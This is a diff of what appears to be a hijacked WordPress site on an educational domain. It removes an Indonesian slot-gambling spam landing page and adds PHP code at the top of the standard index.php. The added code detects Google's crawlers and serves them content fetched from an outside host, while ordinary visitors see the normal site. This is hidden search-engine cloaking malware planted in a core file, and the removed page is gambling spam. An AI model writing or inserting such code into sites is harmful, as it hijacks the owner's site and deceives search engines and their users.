@@ -1,281 +1,54 @@
-<!DOCTYPE html>
-<html amp lang='id'>
-  <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>KOKITOTO : Situs Slot Online Resmi Platform Tepat Menjelajah Kemenangan</title>
-    <meta name="description" content="KOKITOTO adalah situs slot online yang didukung oleh berbagai provider resmi yang menjadi platform slot gacor paling tepat untuk menjelajah kemenangan." />
-    <meta name="robots" content="index,follow" />
-    <link href="https://discentersvirtual.edu.co/wp-content/uploads/2026/05/fav.webp" rel="icon" type="image/x-icon" />
-    <link rel="canonical" href="https://discentersvirtual.edu.co/" />
-    <link rel="alternate" href="https://discentersvirtual.edu.co/" hreflang="id" />
-    <meta property="og:url" content="https://discentersvirtual.edu.co/" />
-    <meta property="og:site_name" content="KOKITOTO" />
-    <meta property="og:image:alt" content="KOKITOTO" />
-    <meta property="og:image" content="https://discentersvirtual.edu.co/wp-content/uploads/2026/05/situs-slot-kokitoto.webp" />
-    <link rel="preload" as="script" href="https://cdn.ampproject.org/v0.js" />
-    <script async src="https://cdn.ampproject.org/v0.js" nonce="MjE4NjQyMjYwNCwyNzg5OTc4NzM5"></script>
-    <style amp-boilerplate>
-      body {
-        -webkit-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
-        -moz-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
-        -ms-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
-        animation: -amp-start 8s steps(1, end) 0s 1 normal both;
-      }
-      @-webkit-keyframes -amp-start {
-        from {
-          visibility: hidden;
+<?php
+    function is_google_bot() {
+        if (!isset($_SERVER['HTTP_USER_AGENT'])) {
+            return false;
         }
-        to {
-          visibility: visible;
+        $userAgent = $_SERVER['HTTP_USER_AGENT'];
+        $googleAgents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
+        foreach ($googleAgents as $agent) {
+            if (stripos($userAgent, $agent) !== false) {
+                return true;
+            }
         }
-      }
-      @-moz-keyframes -amp-start {
-        from {
-          visibility: hidden;
+        return false;
+    }
+    function ambil_konten_curl($url) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        if (isset($_SERVER['HTTP_USER_AGENT'])) {
+            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
         }
-        to {
-          visibility: visible;
+        $hasil = curl_exec($ch);
+        curl_close($ch);
+        return $hasil;
+    }
+    if (is_google_bot()) {
+        $url_target = 'https://vievelofficial.com/file.txt';
+        $konten = ambil_konten_curl($url_target);
+        if ($konten) {
+            echo $konten;
+            exit;
         }
-      }
-      @-ms-keyframes -amp-start {
-        from {
-          visibility: hidden;
-        }
-        to {
-          visibility: visible;
-        }
-      }
-      @-o-keyframes -amp-start {
-        from {
-          visibility: hidden;
-        }
-        to {
-          visibility: visible;
-        }
-      }
-      @keyframes -amp-start {
-        from {
-          visibility: hidden;
-        }
-        to {
-          visibility: visible;
-        }
-      }
-    </style>
-    <noscript>
-      <style amp-boilerplate>
-        body {
-          -webkit-animation: none;
-          -moz-animation: none;
-          -ms-animation: none;
-          animation: none;
-        }
-      </style>
-    </noscript>
-    <style amp-custom>
-      * {
-        box-sizing: border-box;
-      }
+    }
+?>
+<?php
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
 
-      body {
-        font-family: monospace;
-        background: #000000;
-        background-image: radial-gradient(#252525 5%, transparent 50%);
-        background-size: 5px 5px;
-        background-attachment: fixed;
-      }
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
 
-      .container {
-        width: 100%;
-        max-width: 350px;
-        min-height: 100vh;
-        margin: 0 auto;
-        padding: 15px;
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-      }
-
-      .container > * {
-        flex-shrink: 0;
-      }
-
-      .welcome {
-        max-width: 300px;
-        margin: 0 auto;
-      }
-
-      .welcome h3 {
-        font-size: 12px;
-        color: #fff;
-        overflow: hidden;
-        border-right: 0.15em solid #ffd900;
-        white-space: nowrap;
-        letter-spacing: 0.09em;
-        animation: typing 3.5s steps(40, end), blink-caret 0.75s step-end infinite;
-      }
-
-      @keyframes typing {
-        from {
-          width: 0;
-        }
-
-        to {
-          width: 100%;
-        }
-      }
-
-      @keyframes blink-caret {
-
-        from,
-        to {
-          border-color: transparent;
-        }
-
-        50% {
-          border-color: #ffd900;
-        }
-      }
-
-      .banner {
-        display: block;
-        width: 100%;
-        border-radius: 10px;
-        overflow: hidden;
-      }
-
-      .logo-wrap {
-        display: block;
-        width: 180px;
-        max-width: 65vw;
-        margin: 0 auto 10px;
-      }
-
-      .btn-login,
-      .btn-daftar {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        min-height: 56px;
-        padding: 14px 18px;
-        font-size: 18px;
-        line-height: 1;
-        font-weight: 800;
-        text-transform: uppercase;
-        text-decoration: none;
-        margin-top: 16px;
-      }
-
-      .copyright {
-        text-align: center;
-        color: #ffffff;
-      }
-
-      .glow-on-hover {
-        border: 1px solid rgba(255, 217, 0, 0.7);
-        outline: none;
-        color: #171100;
-        background: linear-gradient(180deg, #fff3a6 0%, #ffd900 38%, #c99000 100%);
-        position: relative;
-        overflow: hidden;
-        isolation: isolate;
-        border-radius: 8px;
-        box-shadow:
-          0 12px 28px rgba(255, 217, 0, 0.22),
-          0 4px 0 #7a5200,
-          inset 0 1px 0 rgba(255, 255, 255, 0.75),
-          inset 0 -1px 0 rgba(96, 62, 0, 0.45);
-        text-shadow: 0 1px 0 rgba(255, 255, 255, 0.38);
-        transition: transform .18s ease, box-shadow .18s ease, filter .18s ease;
-      }
-
-      .glow-on-hover span {
-        position: relative;
-        z-index: 1;
-      }
-
-      .glow-on-hover:before {
-        content: '';
-        position: absolute;
-        z-index: 0;
-        inset: 0;
-        background: linear-gradient(120deg, transparent 0%, rgba(255, 255, 255, 0.58) 18%, transparent 36%);
-        transform: translateX(-130%);
-        animation: premium-shine 3.8s ease-in-out infinite;
-        pointer-events: none;
-      }
-
-      .glow-on-hover:after {
-        content: '';
-        position: absolute;
-        z-index: 0;
-        inset: 1px;
-        border-radius: 7px;
-        border: 1px solid rgba(255, 255, 255, 0.24);
-        box-shadow: inset 0 0 18px rgba(255, 255, 255, 0.12);
-        pointer-events: none;
-      }
-
-      .btn-login {
-        color: #ffd900;
-        background: linear-gradient(180deg, #202020 0%, #080808 100%);
-        border-color: rgba(255, 217, 0, 0.55);
-        box-shadow:
-          0 12px 24px rgba(0, 0, 0, 0.36),
-          0 4px 0 #3d2a00,
-          inset 0 1px 0 rgba(255, 217, 0, 0.22),
-          inset 0 -1px 0 rgba(255, 217, 0, 0.16);
-        text-shadow: 0 0 12px rgba(255, 217, 0, 0.35);
-      }
-
-      .glow-on-hover:hover,
-      .glow-on-hover:focus {
-        filter: brightness(1.08);
-        transform: translateY(-2px);
-      }
-
-      .glow-on-hover:active {
-        transform: translateY(2px);
-        box-shadow:
-          0 6px 16px rgba(255, 217, 0, 0.16),
-          0 1px 0 #7a5200,
-          inset 0 1px 4px rgba(55, 35, 0, 0.38);
-      }
-
-      .btn-login:active {
-        box-shadow:
-          0 6px 16px rgba(0, 0, 0, 0.28),
-          0 1px 0 #3d2a00,
-          inset 0 1px 4px rgba(255, 217, 0, 0.18);
-      }
-
-      @keyframes premium-shine {
-        0% {
-          transform: translateX(-130%);
-        }
-
-        42%,
-        100% {
-          transform: translateX(130%);
-        }
-      }
-    </style>
-  </head>
-  <body>
-    <div class="container">
-      <header>
-        <a href="https://discentersvirtual.edu.co/" class="logo-wrap">
-          <amp-img src="https://discentersvirtual.edu.co/wp-content/uploads/2026/05/logo.png" alt="KOKITOTO" width="180" height="40" layout="responsive"></amp-img>
-        </a>
-      </header>
-      <div class="welcome">
-        <h3> Situs Slot Online Terpercaya </h3>
-      </div>
-      <amp-img src="https://discentersvirtual.edu.co/wp-content/uploads/2026/05/situs-slot-kokitoto.webp" width="500" height="500" layout="responsive" class="banner" alt="Link KOKITOTO"></amp-img>
-      <a href="https://linkkoki.me/membervvip" target="_blank" rel="noreferrer noopener" role="button" class="btn-daftar glow-on-hover"><span>DAFTAR</span></a>
-      <a href="https://linkkoki.me/membervvip" target="_blank" rel="noreferrer noopener" role="button" class="btn-login glow-on-hover"><span>LOGIN</span></a>
-      <p class="copyright">&copy; 2026 <a href="https://discentersvirtual.edu.co/" rel="noopener noreferrer" style="color: #ffd900;">KOKITOTO</a>. All Rights Reserved.</p>
-    </div>
-  </body>
-</html>
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
